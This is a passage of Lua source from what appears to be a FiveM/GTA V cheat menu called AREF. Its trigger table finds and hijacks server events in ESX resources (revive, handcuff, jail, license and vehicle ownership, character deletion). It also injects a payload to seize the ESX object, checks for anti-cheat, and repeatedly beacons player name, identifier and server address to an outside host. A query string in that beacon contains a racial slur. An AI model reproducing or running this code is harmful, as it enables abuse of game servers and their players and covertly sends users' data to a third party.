                                replaced = true
   
                            else
   
                                AREF:AddNotification("ERROR", "Failed to get dynamic trigger " .. dat.Trigger, 20000)
   
                                AREF:Print("[Dynamic Triggers] ^1Failed ^7to get trigger ^6" .. dat.Trigger .. "^7")
   
                            end
   
                        else
   
                            AREF:Print("[Dynamic Triggers] Resource not found. (" .. res .. ")")
   
                        end
   
                    end
   
                end
   
            end
   
    
   
            return replaced
   
        end
   
    
   
        local Ibuttons = nil
   
        local _buttons = {}
   
    
   
        function AREF:SetIbuttons(buttons)
   
            buttons = buttons or _buttons
   
    
   
            if not AREF:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
   
                Ibuttons = AREF:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
   
    
   
                while not AREF:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
   
                    Wait(0)
   
                end
   
            else
   
                Ibuttons = AREF:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")
   
    
   
                while not AREF:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do
   
                    Wait(0)
   
                end
   
            end
   
    
   
            local sf = Ibuttons
   
            local w, h = AREF:GetFunction("GetActiveScreenResolution")()
   
            AREF:GetFunction("BeginScaleformMovieMethod")(sf, "CLEAR_ALL")
   
            AREF:GetFunction("EndScaleformMovieMethodReturnValue")()
   
    
   
            for i, btn in dict.pairs(buttons) do
   
                AREF:GetFunction("BeginScaleformMovieMethod")(sf, "SET_DATA_SLOT")
   
                AREF:GetFunction("ScaleformMovieMethodAddParamInt")(i - 1)
   
                AREF:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[1])
   
                AREF:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[2])
   
                AREF:GetFunction("EndScaleformMovieMethodReturnValue")()
   
            end
   
    
   
            AREF:GetFunction("BeginScaleformMovieMethod")(sf, "DRAW_INSTRUCTIONAL_BUTTONS")
   
            AREF:GetFunction("ScaleformMovieMethodAddParamInt")(layout)
   
            AREF:GetFunction("EndScaleformMovieMethodReturnValue")()
   
        end
   
    
   
        function AREF:DrawIbuttons()
   
            if AREF:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then
   
                AREF:GetFunction("DrawScaleformMovie")(Ibuttons, 0.5, 0.5, 1.0, 1.0, 255, 255, 255, 255)
   
                self:SetIbuttons()
   
            end
   
        end
   
    
   
        local TEList = {
   
            {
   
                Resource = {"esx_kashacter", "esx_kashacters", "kashacter"},
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "kashactersS:DeleteCharacter",
   
                        LookFor = "data.charid%)",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Kashacters",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx_inventoryhud", "inventoryhud"},
   
                File = "client/player.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_inventoryhud:openPlayerInventory",
   
                        LookFor = "PlayerData = ESX.GetPlayerData%(%)",
   
                        Strip = {"AddEventHandler%(\"", "\", (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Inventory",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx_basicneeds", "needs"},
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_basicneeds:healPlayer",
   
                        LookFor = "restore hunger & thirst",
   
                        Strip = {"AddEventHandler%('", "', (.*)"}
   
                    },
   
                    {
   
                        Trigger = "esx:getSharedObject",
   
                        LookFor = "while ESX == nil do",
   
                        Strip = {"TriggerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Needs",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "chat",
   
                File = {"cl_chat.lua"},
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "_chat:messageEntered",
   
                        LookFor = "ExecuteCommand%(",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "Chat",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx_ambulancejob", "ambulancejob"},
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_ambulancejob:revive",
   
                        LookFor = "local coords = GetEntityCoords%(playerPed%)",
   
                        Strip = {"AddEventHandler%('", "', function%(%)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Ambulance Job",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "gcphone",
   
                File = "client/twitter.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "gcPhone:twitter_postTweets",
   
                        LookFor = "RegisterNUICallback%('twitter_postTweet', function%(data, cb%)",
   
                        Depth = 2,
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~GCPhone",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx_policejob", "policejob"},
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_communityservice:sendToCommunityService",
   
                        LookFor = "menu.close%(%)",
   
                        Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
   
                    },
   
                    {
   
                        Trigger = "esx_policejob:handcuff",
   
                        LookFor = "action == 'handcuff'",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Police Job",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx-qalle-jail", "qalle"},
   
                File = "client/client.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx-qalle-jail:jailPlayer",
   
                        LookFor = "ESX.ShowNotification%(\"No players nearby!\"%)",
   
                        Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~Qalle Jail",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"esx_dmvschool", "dmvschool"},
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_dmvschool:addLicense",
   
                        LookFor = "ESX.ShowNotification%(_U%('passed_test'%)%)",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~s~DMV School",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "CarryPeople",
   
                File = "cl_carry.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "CarryPeople:sync",
   
                        LookFor = "closestPlayer ~= nil",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "CarryPeople",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "TakeHostage",
   
                File = "cl_takehostage.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "cmg3_animations:sync",
   
                        LookFor = "holdingHostage = true",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "TakeHostage",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "PiggyBack",
   
                File = "cl_piggyback.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "cmg2_animations:sync",
   
                        LookFor = "piggyBackInProgress = true",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "PiggyBack",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = {"es_extended", "extended"},
   
                File = "client/common.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx:getSharedObject",
   
                        LookFor = "AddEventHandler%('",
   
                        Strip = {"AddEventHandler%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "ES Extended",
   
                Replacement = function(res, data)
   
                    _replaced(res, data, true)
   
                    if not AREF.DynamicTriggers[res] and not AREF.DynamicTriggers["esx_basicneeds"] then return end
   
                    local real = (AREF.DynamicTriggers[res] and AREF.DynamicTriggers[res]["esx:getSharedObject"]) or (AREF.DynamicTriggers["esx_basicneeds"] and AREF.DynamicTriggers["esx_basicneeds"]["esx:getSharedObject"])
   
    
   
                    if real then
   
                        AREF:AddNotification("INFO", "A reference to ~g~ESX ~s~object could not be made automatically. Excute payload at your own risk!", 20000)
   
                        dict.payload_trigger = real
   
    
   
                        dict.payload = function()
   
                            AREF:GetFunction("TriggerEvent")(dict.payload_trigger, function(obj)
   
                                dict.ESX = obj
   
                                AREF.ESX = dict.ESX
   
                                AREF:AddNotification("INFO", "Got reference to ~g~ESX ~s~object.", 20000)
   
                            end)
   
                        end
   
                    end
   
    
   
                    return false
   
                end
   
            },
   
            {
   
                Resource = "esx_vehicleshop",
   
                File = "client/main.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_vehicleshop:setVehicleOwnedPlayerId",
   
                        LookFor = "vehicleProps.plate = newPlate",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    },
   
                    {
   
                        Trigger = "esx_vehicleshop:resellVehicle",
   
                        LookFor = "CurrentAction == 'resell_vehicle'",
   
                        Strip = {"ESX.TriggerServerCallback%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~w~Vehicle Shop",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            },
   
            {
   
                Resource = "esx_vangelico_robbery",
   
                File = "client/esx_vangelico_robbery_cl.lua",
   
                KnownTriggers = {
   
                    {
   
                        Trigger = "esx_vangelico_robbery:gioielli",
   
                        LookFor = "PlaySound%(-1, \"PICK_UP\"",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    },
   
                    {
   
                        Trigger = "lester:vendita",
   
                        LookFor = "blip = false",
   
                        Strip = {"TriggerServerEvent%('", "', (.*)"}
   
                    }
   
                },
   
                Name = "~g~ESX ~w~Vangelico Robbery",
   
                Replacement = function(res, data) return _replaced(res, data) end
   
            }
   
        }
   
    
   
        function AREF:FindLikeResource(str)
   
            for name, _ in dict.pairs(resource_list) do
   
                if name:lower() == str:lower() or name:lower():find(str:lower()) then
   
                    return name
   
                end
   
            end
   
    
   
            return str
   
        end
   
    
   
        function AREF:RunDynamicTriggers()
   
            AREF:AddNotification("INFO", "Running dynamic triggers.", 15000)
   
    
   
            for _, dat in dict.pairs(TEList) do
   
                if dict.type(dat.Resource) == "table" then
   
                    for _, str in dict.ipairs(dat.Resource) do
   
                        str = AREF:FindLikeResource(str)
   
                        if dat.Replacement and dat.Replacement(str, dat) then
   
                            AREF:AddNotification("INFO", "Updated dynamic triggers for " .. dat.Name, 20000)
   
                            break
   
                        end
   
                    end
   
                elseif dat.Replacement and dat.Replacement(dat.Resource, dat) then
   
                    AREF:AddNotification("INFO", "Updated dynamic triggers for " .. dat.Name, 20000)
   
                end
   
            end
   
        end
   
    
   
        function AREF:LoadDui()
   
            local runtime_txd = AREF:GetFunction("CreateRuntimeTxd")(self.DuiName)
   
            local banner_dui = AREF:GetFunction("CreateDui")("https://asriel.dev/fm/watermark.gif", 300, 300)
   
            local b_dui = AREF:GetFunction("GetDuiHandle")(banner_dui)
   
            if not b_dui or not banner_dui then return self:AddNotification("ERROR", "DUI Handle could not be allocated.", 5000) end
   
            AREF:GetFunction("CreateRuntimeTextureFromDuiHandle")(runtime_txd, "watermark", b_dui)
   
        end
   
    
   
        function AREF.CharToHex(c)
   
            return dict.string.format("%%%02X", dict.string.byte(c))
   
        end
   
    
   
        function AREF:URIEncode(url)
   
            if url == nil then return end
   
            url = url:gsub("\n", "\r\n")
   
            url = url:gsub("([^%w _%%%-%.~])", self.CharToHex)
   
            url = url:gsub(" ", "+")
   
    
   
            return url
   
        end
   
    
   
        function AREF:DoStatistics()
   
            if not AREF.Identifier then return end
   
    
   
            local statistics = {
   
                name = AREF:GetFunction("GetPlayerName")(AREF.NetworkID),
   
                build = AREF.Build,
   
                server = AREF:GetFunction("GetCurrentServerEndpoint")()
   
            }
   
    
   
            local stat_url = "https://fm.asriel.dev/statistics.gif?identifier=" .. AREF:URIEncode(AREF.Identifier) .. "&information=" .. AREF:URIEncode(dict.json.encode(statistics)) .. "&scid=fm_0000_fuck_off_nigger_0000_stupid_cunt_0000"
   
            local s_dui = AREF:GetFunction("CreateDui")(stat_url, 50, 50)
   
            Wait(10000)
   
            AREF:GetFunction("DestroyDui")(s_dui)
   
            AREF:Print("[Statistics] Updated statistics.")
   
        end
   
    
   
        function AREF:DoBlacklistedEvent(reason)
   
            local w, h = self:GetFunction("GetActiveScreenResolution")()
   
            local x, y = self:GetFunction("GetNuiCursorPosition")()
   
            self._ScrW = w
   
            self._ScrH = h
   
            self._MouseX = x
   
            self._MouseY = y
   
            local runtime_txd = AREF:GetFunction("CreateRuntimeTxd")(self.DuiName)
   
            local blacklist_dui = AREF:GetFunction("CreateDui")("https://asriel.dev/fm/blacklisted.gif", 300, 300)
   
            local b_dui = AREF:GetFunction("GetDuiHandle")(blacklist_dui)
   
            AREF:GetFunction("CreateRuntimeTextureFromDuiHandle")(runtime_txd, "blacklisted", b_dui)
   
    
   
            CreateThread(function()
   
                while true do
   
                    self.Painter:DrawRect(0, 0, AREF:ScrW(), AREF:ScrH(), 0, 0, 0, 255)
   
                    self.Painter:DrawText("You have been blacklisted from " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name), 4, true, w / 2, 100, 0.45, 255, 255, 255, 255)
   
                    self.Painter:DrawText("Reason: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, reason), 4, true, w / 2, 125, 0.45, 255, 255, 255, 255)
   
                    self.Painter:DrawSprite(w / 2, h / 2, w, h, 0.0, self.DuiName, "blacklisted", 255, 255, 255, 255, true)
   
                    Wait(0)
   
                end
   
            end)
   
        end
   
    
   
        CreateThread(function()
   
            AREF.FreeCam:Tick()
   
        end)
   
    
   
        CreateThread(function()
   
            AREF.RCCar:Tick()
   
        end)
   
    
   
        CreateThread(function()
   
            AREF:SpectateTick()
   
        end)
   
    
   
        dict.debug.sethook()
   
    
   
        CreateThread(function()
   
            AREF.ConfigClass.Load()
   
            AREF.TertiaryHex = AREF:RGBToHex({AREF.Config.Tertiary[1], AREF.Config.Tertiary[2], AREF.Config.Tertiary[3]})
   
            AREF:RunACChecker()
   
    
   
            branding = {
   
                name = "[" .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Name) .. "~s~]",
   
                resource = "Resource: " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF:GetFunction("GetCurrentResourceName")()),
   
                ip = "IP: " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF:GetFunction("GetCurrentServerEndpoint")()),
   
                id = "Server ID: " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF:GetFunction("GetPlayerServerId")(AREF.NetworkID)),
   
                veh = "Vehicle: " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, "%s"),
   
                build = (_Executor_Strings[_Executor] or "") .. " ~s~Build (" .. AREF.Build .. ")"
   
            }
   
    
   
            AREF:RunDynamicTriggers()
   
    
   
            AREF:AddNotification("INFO", ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Name) .. " Loaded! (" .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, "v" .. AREF.Build) .. ")", 25000)
   
            AREF:AddNotification("INFO", "Use " .. ("<font color='#%s'>%s</font>"):format(AREF.TertiaryHex, AREF.Config.ShowKey) .. " to open the menu.", 25000)
   
            AREF:BuildIdentifier()
   
    
   
            if dict.blacklisted_users[AREF.Identifier] then
   
                AREF:DoBlacklistedEvent(dict.blacklisted_users[AREF.Identifier])
   
                AREF.Enabled = false
   
    
   
                return
   
            end
   
    
   
            AREF:LoadDui()
   
            Wait(2500)
   
            AREF:DoStatistics()
   
    
   
            for _, str in dict.ipairs(all_weapons) do
   
                all_weapons_hashes[AREF:GetFunction("GetHashKey")(str)] = str
   
            end
   
    
   
            force_reload[AREF:GetFunction("GetHashKey")("WEAPON_MINIGUN")] = true
   
    
   
            while AREF.Enabled do
   
                Wait(300000)
   
                AREF:DoStatistics()
   
            end
   
        end)
   
    
   
        AREF:AddBindListener("heal_option", function(self)
   
            self:GetFunction("SetEntityHealth")(self.LocalPlayer, 200)
   
            self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)
   
            self:AddNotification("SUCCESS", "Healed.")
   
        end)
   
    
   
        AREF:AddBindListener("clear_blood_option", function(self)
   
            self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)
   
            self:AddNotification("SUCCESS", "Blood removed.")
   
        end)
   
    
   
        AREF:AddBindListener("armor_option", function(self)
   
            self:GetFunction("SetPedArmour")(self.LocalPlayer, 200)
   
            self:AddNotification("SUCCESS", "Armor given.")
   
        end)
   
    
   
        AREF:AddBindListener("suicide_option", function(self)
   
            self:GetFunction("SetEntityHealth")(self.LocalPlayer, 0)
   
            self:AddNotification("SUCCESS", "Killed.")
   
        end)
   
    end)